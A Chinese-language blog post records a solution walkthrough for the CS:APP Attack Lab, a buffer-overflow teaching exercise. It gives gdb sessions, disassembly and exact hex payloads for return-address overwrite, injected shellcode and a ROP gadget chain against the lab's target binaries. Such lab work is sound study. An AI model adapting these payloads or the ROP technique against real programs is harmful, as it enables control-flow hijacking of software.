---
title: CS:APP Attack Lab记录
date: 2023-02-19 17:20:08 
tags: CS
---



# 前置知识

## 缓冲区溢出

将栈指针作为输入，则若缓冲区溢出，整个栈帧都会受影响。而栈需要保存返回的断点，若栈帧相邻，则可以改变返回函数的断点，从而返回到我们指定的一个函数。针对溢出，有三种处理方式

1. 设置段寻址的，每次的值不同的canary值，通过gdb可以知道单次的值

<img src="/images/reg_canary.png" alt="金丝雀值" style="zoom:50%;"/>

2. 每次的stack地址随机，不一定能跳装到字符串的地址运行。但全局变量和代码的位置不变。
3. 设置栈区的值为不可执行代码

ROP attack，借助已有的代码，和ret的特性，不断借助栈跳转代码以达到目的。

<img src="/images/ROP_attack.png" alt="ROP方式" style="zoom:50%;"  />

# 具体流程

## Quick Start

```bash
wget http://csapp.cs.cmu.edu/3e/target1.tar
tar -xvf target1.tar 
```

结合汇编代码中16进制数代表的指令，通过hex2raw输入程序，可以注入自己想要让其运行的程序，达到攻击的效果。注意不能包含0x0a，代表\n。其中借助Code injection完成3个touch函数的调用，借助Return-oriented programming完成两个函数的调用。

## Phase1

<img src="/images/phase_1.png" alt="phase 1" style="zoom:50%;"/>

先通过gdb判断汇编函数的入口在于stable_launch -> launch -> test

```bash
break *test
run -q
```

```assembly
 900 0000000000401968 <test>:
 901   401968:   48 83 ec 08             sub    $0x8,%rsp
 902   40196c:   b8 00 00 00 00          mov    $0x0,%eax
 903   401971:   e8 32 fe ff ff          callq  4017a8 <getbuf>
 904   401976:   89 c2                   mov    %eax,%edx
 905   401978:   be 88 31 40 00          mov    $0x403188,%esi
 906   40197d:   bf 01 00 00 00          mov    $0x1,%edi
 907   401982:   b8 00 00 00 00          mov    $0x0,%eax
 908   401987:   e8 64 f4 ff ff          callq  400df0 <__printf_chk@plt>
 909   40198c:   48 83 c4 08             add    $0x8,%rsp
 910   401990:   c3                      retq

# getbuf栈的大小为40Byte
00000000004017a8 <getbuf>:
 778   4017a8:   48 83 ec 28             sub    $0x28,%rsp
 779   4017ac:   48 89 e7                mov    %rsp,%rdi 
 780   4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
 781   4017b4:   b8 01 00 00 00          mov    $0x1,%eax
 782   4017b9:   48 83 c4 28             add    $0x28,%rsp
 783   4017bd:   c3                      retq
 784   4017be:   90                      nop
 785   4017bf:   90                      nop

```

结合writeup可知C语言的函数为

```c
void test() {
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

结合gdb判断跳转函数

```bash
# 对应返回函数的值
x $rsp
# call getbuf前的rsp: 0x5561dca8 
# call 之后rsp: 0x5561dca0 可以看出留出了8byte
# x $rsp : 0x00401976 对应返回的断点
# sub 0x28 rsp:0x5561dc78 作为输入的函数 因此只需要把 0x5561dca0对应的值改成touch1的地址即可
# 40Byte的字符串 将最后8byte作为返回地址输入即可
# 00 00 00 00 00 40 17 c0 
./hex2raw < phase_1.txt > phase_1-raw.txt
./ctarget -q < phase_1-raw.txt
# ? illlegal instruction 
# 注意小端序存储 原以为8byte
# 似乎只要4byte
x $rsp 0x5561dca0:     0x00401976
# pass
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
C0 17 40 00 00 00 00 00
```

## Phase2

<img src="/images/phase_2.png" alt="phase 2" style="zoom:50%;"/>

在栈的位置执行代码，输入特定的代码

```assembly
# 需要注入cookies的参数 32bit
mov 0x59b997fa %edi 

# 参考这个代码
bf 01 00 00 00          mov    $0x1,%edi
bf fa 97 b9 59 			

# 根据提示，应该根据ret进行跳装 当前rsp的值就是返回的值 
# ?不定长 5byte
bf fa 97 b9 59 # mov $0x59b997fa %edi  
c3  # retq
0x5561dc78 # pc1
0x4017ec # pc2
bf fa 97 b9 59 c3 FF FF
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00 
```

## Phase3

<img src="/images/phase_3.png" alt="phase 3" style="zoom:50%;" />

edi为指针，使得值相同

```assembly
0x5561dc78 # pc1
0x4018fa # pc2
0x59b997fa #cookie

bf 80 dc 61 55 c3 FF FF
35 39 62 39 39 37 66 61 
00 FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
78 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00


# 似乎被覆盖了?
# 需要在更前面
bf b0 dc 61 55 c3 FF FF
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
78 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 
00 FF FF FF FF FF FF FF

# pass
```

## phase4

借助rop的gadget，源代码设计了gadget farm，便于操作。

```bash
objdump -d rtarget > b.asm
```

```assembly
# :/retq 在vim寻找retq可以借助ret来跳转
# :/48 c4 等操作码，观察可以使用的元素 结合指令表格确定需要的操作
# 在最后一次ret之前需要完成设置参数并移动寄存器

# 在start_farm和mid_farm之间，两个gadgets
# 借助popq的特性传参 58 - 5f
# 0x90 nop

# farm
4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
4019cf:   c3                      retq
4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax

# gadget
4019cc:   58 					   popq %rax
4019cd:   90 					   nop
4019ce:   c3					   ret
 
4019a3:   89 c7					   mov %eax, %edi 
4019a5:   c3 					   ret

# 根据上面的跳转设置值
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
FF FF FF FF FF FF FF FF 
cc 19 40 00 00 00 00 00 /* ret gadget 1 */
fa 97 b9 59 00 00 00 00 /* popq %rax */
a3 19 40 00 00 00 00 00 /* ret 4019a3 */
ec 17 40 00 00 00 00 00 /* ret touch2 */

```

